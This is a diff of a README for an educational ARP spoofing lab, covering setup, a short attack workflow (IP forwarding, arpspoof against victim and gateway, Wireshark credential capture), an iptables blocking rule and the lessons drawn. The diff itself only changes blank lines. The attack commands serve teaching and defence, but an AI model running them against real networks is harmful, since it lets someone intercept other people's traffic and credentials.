@@ -69,7 +69,7 @@ Vulnerability assessment is the backbone of proactive cybersecurity. This lab hi
 🧠 Purpose
 This lab simulates an ARP spoofing attack to demonstrate vulnerabilities in local network trust models. It highlights how attackers manipulate ARP tables to intercept traffic and how security tools can detect or mitigate such behavior.
 ⚠️ This project is strictly educational and intended for controlled lab environments. Always ensure explicit permission before testing on any network.
-
+\ \
 
 ### 🛠️ Lab Setup
 | Component | Description | 
@@ -77,19 +77,19 @@ This lab simulates an ARP spoofing attack to demonstrate vulnerabilities in loca
 | OS & Tools | Kali Linux with arpspoof, wireshark, iptables | 
 | Network Configuration | Same subnet, no dynamic port security | 
 | Traffic Generator | Use ping, curl, or a web browser on victim | 
-
+\
 
 
 ### 🧪 Attack Workflow
 # 1. Enable IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
-
+\ \
 # 2. Launch ARP spoof against victim and gateway
 arpspoof -i eth0 -t [victim_ip] [gateway_ip]
 arpspoof -i eth0 -t [gateway_ip] [victim_ip]
-
+\ \
 # 3. Capture traffic (e.g., credentials) with Wireshark
-
+\ \
 
 
 
@@ -97,13 +97,13 @@ arpspoof -i eth0 -t [gateway_ip] [victim_ip]
 # Block spoofed traffic using iptables
 iptables -A INPUT -m mac --mac-source [attacker_mac] -j DROP
 
-
+\
 
 ### 📚 Educational Takeaways
 - ARP lacks authentication, making LANs susceptible to spoofing.
 - Dynamic ARP tables can be manipulated silently.
 - Proper segmentation, static ARP, and intrusion detection can help mitigate risks.
-
+\
 ### 📁 Files Included
 - demo_notes.md: Step-by-step walkthrough
 - lab_topology.png: Network diagram
